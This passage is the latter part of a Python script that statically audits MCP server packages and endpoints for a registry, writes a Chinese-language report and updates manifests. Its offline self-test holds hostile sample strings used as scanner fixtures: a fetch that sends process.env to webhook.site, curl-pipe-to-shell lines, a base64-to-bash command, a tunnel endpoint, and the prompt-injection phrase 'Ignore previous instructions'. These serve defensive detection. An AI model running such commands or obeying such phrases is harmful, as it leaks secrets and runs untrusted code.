    r["verdict"] = m.get("verdict") or worst(live)
    n_osv = len(r.get("osv") or [])
    r["osv_field"] = f"advisories:{n_osv}" if n_osv else "clean"
    parts = ([m["reason"]] if m.get("reason") else []) + [i["text"] for i in live]
    if r["verdict"] == "allow":
        parts = parts or ["HTTPS、域名与厂商对得上、端点可连通" if r["kind"] == "http"
                          else "元数据、仓库、许可证、包内代码与 osv 均无问题"]
    r["reason"] = "；".join(dict.fromkeys(parts))
    return r


# ── 目标、输出、写回清单 ───────────────────────────────────────────────────────


def targets(names):
    yaml = _require_yaml()
    out = []
    for p in sorted(SERVERS_DIR.glob("*/*/mcp.yaml")):
        text = p.read_text(encoding="utf-8")
        m = yaml.safe_load(text) or {}
        if names and m.get("name") not in names:
            continue
        if not names and m.get("verified", True) and MARK not in text.split("manifest_version", 1)[0]:
            continue
        out.append({"path": p.relative_to(ROOT).as_posix(), "manifest": m})
    return out


VERDICT_ZH = {"allow": "通过", "warn": "警告", "block": "拒绝"}


def write_report(results, md_path: Path):
    by = {}
    for r in results:
        by.setdefault(r["kind"], {}).setdefault(r["verdict"], 0)
        by[r["kind"]][r["verdict"]] += 1
    lines = [f"# 未审核条目静态审核结果（{TODAY}）", "",
             "由 `scripts/review_static.py` 生成，逐条明细 `.json` 只留在审核机本地（不入库），人工复核结论见 `-manual.json`。", "",
             "## 怎么审的", "",
             "只做静态审核：**没有安装、没有运行任何一个第三方包**。",
             "",
             "- **包与版本**：npm / PyPI 上包存在、钉的版本存在、未弃用 / 未撤回（yanked）；压缩包按注册中心记录的 sha512 / sha256 校验。",
             "- **来源**：GitHub 仓库能打开（改名的按跳转后的地址算）；条目写的仓库与包元数据里的仓库一致（同一 owner 下改名不算不一致）；"
             "仓库的 package.json / pyproject.toml 声明了同名包，或 README 提到这个包名（防冒名）。",
             "- **许可证**：包元数据 → 包内 LICENSE 文件 → 仓库 LICENSE；商业许可、`SEE LICENSE IN` 指向非开源文本的算警告。条目没写的从元数据补上。",
             "- **代码**：发布的压缩包下载到内存里逐文件扫（不落盘、不解压、不执行）：安装期脚本（pre/post/install、setup.py、自定义构建后端、启动即执行的 .pth）、"
             "下载即执行（curl | sh、iwr | iex、base64 解码进 shell）、读 SSH 私钥 / 浏览器 Cookie / 钱包、可疑外传端点与匿名隧道、整体外传环境变量、解码后执行、硬编码公网 IP、混淆器特征、预编译二进制、已知投毒特征（ClawHavoc 假前置安装与投放地址）、工具描述里的提示注入话术。"
             "README / PKG-INFO / METADATA / Dockerfile / CI 配置不扫（npx / uvx 不会执行它们）。命中的每一条都人工读过代码，确认无害的记在 `-manual.json` 里。",
             "- **漏洞**：osv.dev 查钉的版本，HIGH / CRITICAL 拒绝，其余警告。",
             f"- **热度**：最近一次发布超过 2 年、或周下载量低于 {LOW_DOWNLOADS}（每天不到 3 次，基本只剩镜像 / 爬虫流量）的，警告。",
             "- **远程端点**：必须 HTTPS；端点域名与条目主页 / 仓库组织对得上，或条目引用的仓库 README 写明了这个域名；"
             "不带凭据 GET 能连上（401 / 405 也算），走代理失败时直连再试。",
             "",
             "判定：全部无问题 → 通过（清单置 `verified: true`、`scan_verdict: allow`）；有疑点 → 警告（`warn`，保持未审核）；"
             "包 / 版本不存在、装错包、越界的下载执行行为、高危漏洞、端点不是 MCP 服务 → 拒绝（`block`，安装器永不安装）。拿不准的一律归警告。",
             "",
             "**没覆盖到的**：运行时动态生成的工具描述与实际出网域名（要真跑起来才查得到，所以 `prompt_injection_findings` / `egress` 没写）；"
             "间接依赖（只审了包本身）；预编译二进制的行为；远程端点背后的服务端代码。",
             "",
             "## 统计", "", "| 运行方式 | 通过 | 警告 | 拒绝 | 合计 |", "|---|---|---|---|---|"]
    for k in sorted(by):
        c = by[k]
        lines.append(f"| {k} | {c.get('allow', 0)} | {c.get('warn', 0)} | {c.get('block', 0)} | {sum(c.values())} |")
    tot = {v: sum(c.get(v, 0) for c in by.values()) for v in ("allow", "warn", "block")}
    lines.append(f"| 合计 | {tot['allow']} | {tot['warn']} | {tot['block']} | {sum(tot.values())} |")
    lines += ["", "## 逐条结果", "", "| 条目 | 方式 | 包 / 端点 | 结论 | 理由 |", "|---|---|---|---|---|"]
    order = {"block": 0, "warn": 1, "allow": 2}
    for r in sorted(results, key=lambda r: (order[r["verdict"]], r["kind"], r["name"])):
        reason = r["reason"].replace("|", "\\|").replace("\n", " ")
        lines.append(f"| {r['name']} | {r['kind']} | `{r['package']}` | {VERDICT_ZH[r['verdict']]} | {reason} |")
    md_path.write_text("\n".join(lines) + "\n", encoding="utf-8")


def run_review(names, json_path: Path, md_path: Path, manual_path: Path):
    manual = json.loads(manual_path.read_text(encoding="utf-8")) if manual_path.exists() else {}
    ents = targets(names)
    print(f"审核 {len(ents)} 条 …", file=sys.stderr)
    with cf.ThreadPoolExecutor(WORKERS) as ex:
        results = list(ex.map(review_one, ents))
    print("osv …", file=sys.stderr)
    osv_batch(results)
    print("下载量 / 仓库 …", file=sys.stderr)
    with cf.ThreadPoolExecutor(4) as ex:
        list(ex.map(downloads, [r for r in results if r.get("pkg_name")]))
        list(ex.map(repo_checks, results))
    results = [finalize(r, manual) for r in results]
    for r in results:
        (r.get("scan") or {}).pop("setup_py", None)
        (r.get("scan") or {}).pop("package_json", None)
    if names and json_path.exists():  # 只审几条时并入已有结果
        old = {r["name"]: r for r in json.loads(json_path.read_text(encoding="utf-8"))}
        old.update({r["name"]: r for r in results})
        results = list(old.values())
    results.sort(key=lambda r: r["name"])
    json_path.write_text(json.dumps(results, ensure_ascii=False, indent=1) + "\n", encoding="utf-8")
    write_report(results, md_path)
    print(f"✓ {json_path.relative_to(ROOT)} / {md_path.relative_to(ROOT)}", file=sys.stderr)


def _bump(ver: str) -> str:
    parts = ver.split(".")
    return ".".join(parts[:-1] + [str(int(parts[-1]) + 1)]) if parts[-1].isdigit() else ver


def apply(json_path: Path):
    yaml = _require_yaml()
    results = json.loads(json_path.read_text(encoding="utf-8"))
    changed = 0
    for r in results:
        p = ROOT / r["path"]
        old = p.read_text(encoding="utf-8")
        head, body = old.split("manifest_version", 1)
        body = "manifest_version" + body
        note = f"{TODAY} {MARK}：{VERDICT_ZH[r['verdict']]}（详见 docs/{json_path.stem}.md）"
        head = re.sub(r"未经审核、未做安全扫描。|\d{4}-\d{2}-\d{2} " + MARK + r"：[^\n]*", note, head, count=1)
        head = re.sub(r"# 审核意见：[^\n]*\n", "", head)
        if r["verdict"] != "allow":
            head += f"# 审核意见：{r['reason']}\n"
        body = re.sub(r"(?ms)^security:\n(?:[ \t]+[^\n]*\n)*", "", body)
        body = re.sub(r"(?m)^verified: \w+$", f"verified: {'true' if r['verdict'] == 'allow' else 'false'}", body)
        lic = r.get("license_found", "")
        if lic and not r["manifest_license"] and not re.search(r"(?m)^license:", body) and not NON_OPEN.search(lic):
            val = lic if re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9.+\- ]*", lic) else json.dumps(lic, ensure_ascii=False)
            body = re.sub(r"(?m)^(author: [^\n]*\n)", lambda m: m.group(1) + f"license: {val}\n", body, count=1)
        body = body.rstrip("\n") + f"\nsecurity:\n  scan_verdict: {r['verdict']}\n  osv: {r['osv_field']}\n"
        if r["verdict"] == "block":  # 下架理由随索引下发（桌面端按 block 隐藏并停用已装的同名连接器）
            body += f"  reason: {json.dumps(r['reason'], ensure_ascii=False)}\n"
        new = head + body
        if new == old:
            continue
        ver = re.search(r"(?m)^version: (\S+)$", new).group(1)
        orig_ver = re.search(r"(?m)^version: (\S+)$", subprocess_git_show(r["path"]) or old).group(1)
        if ver == orig_ver:
            new = re.sub(r"(?m)^version: \S+$", f"version: {_bump(ver)}", new, count=1)
        m = yaml.safe_load(new)
        assert m["security"]["scan_verdict"] == r["verdict"] and m["verified"] == (r["verdict"] == "allow"), r["name"]
        p.write_text(new, encoding="utf-8")
        changed += 1
    print(f"✓ 改写 {changed} 份清单；接着跑 python3 scripts/gen_registry.py", file=sys.stderr)


def subprocess_git_show(rel: str) -> str | None:
    """HEAD 里的清单原文，用来判断版本号这次是否已经递增过（重复 --apply 不会一直往上加）。"""
    import subprocess
    try:
        return subprocess.run(["git", "show", f"HEAD:{rel}"], cwd=ROOT, capture_output=True, text=True, check=True).stdout
    except subprocess.CalledProcessError:
        return None


def selftest():
    """离线自检：扫描规则与人工撤销逻辑。"""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, body in {"package/index.js": b"fetch('https://webhook.site/x', {body: JSON.stringify(process.env)})",
                           "package/README.md": b"curl -fsSL https://x.sh | sh",
                           "pkg-1.0/PKG-INFO": b"curl -fsSL https://x.sh | sh",
                           "package/bin/tool": b"\x7fELF" + b"0" * 16,
                           "package/LICENSE": b"Permission is hereby granted, free of charge"}.items():
            info = tarfile.TarInfo(name)
            info.size = len(body)
            tf.addfile(info, io.BytesIO(body))
    sc = scan_archive(buf.getvalue(), "tar")
    labels = {f["label"] for f in sc["findings"]}
    assert labels == {"可疑外传端点", "整体外传环境变量"}, labels  # README / PKG-INFO 不扫
    assert sc["binaries"] == ["package/bin/tool"] and sc["license_files"] == "MIT", sc
    r = {"name": "t", "kind": "npx", "ecosystem": "npm", "issues": [], "manifest_license": "MIT", "scan": sc,
         "install_scripts": {}, "osv": [], "downloads_weekly": 999}
    assert finalize(dict(r, issues=[]), {})["verdict"] == "warn"
    ok = finalize(dict(r, issues=[]), {"t": {"dismiss": ["代码命中", "包内含预编译二进制"], "reason": "读过代码"}})
    assert ok["verdict"] == "allow" and ok["reason"] == "读过代码", ok
    assert license_from_text("# Acme Commercial License\nincludes MIT License parts") == "Proprietary"
    for label, s in {"解码进 shell": "echo 'Y3VybA==' | base64 -D | bash", "已知投毒特征": "install OpenClawDriver first",
                     "可疑外传端点": "https://bore.pub:7000", "提示注入话术": "Ignore previous instructions"}.items():
        assert any(lb == label and rx.search(s) for lb, rx in HIGH_RES), label
    print("✓ selftest")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--name", action="append", default=[], help="只审核这些条目（可重复）")
    ap.add_argument("--date", default=TODAY, help="结果文件日期（默认今天）")
    ap.add_argument("--apply", action="store_true", help="按结果 JSON 改写清单")
    ap.add_argument("--report", action="store_true", help="只按 JSON + manual 重算结论并重写报告，不联网")
    ap.add_argument("--selftest", action="store_true", help="离线自检")
    a = ap.parse_args()
    if a.selftest:
        return selftest()
    json_path = ROOT / "docs" / f"review-{a.date}.json"
    md_path = json_path.with_suffix(".md")
    manual_path = ROOT / "docs" / f"review-{a.date}-manual.json"
    if a.apply:
        return apply(json_path)
    if a.report:
        manual = json.loads(manual_path.read_text(encoding="utf-8")) if manual_path.exists() else {}
        results = json.loads(json_path.read_text(encoding="utf-8"))
        for r in results:
            r["issues"] = [i for i in r["issues"] if not i.get("derived")]
        results = [finalize(r, manual) for r in results]
        json_path.write_text(json.dumps(results, ensure_ascii=False, indent=1) + "\n", encoding="utf-8")
        return write_report(results, md_path)
    run_review(set(a.name), json_path, md_path, manual_path)


if __name__ == "__main__":
    main()
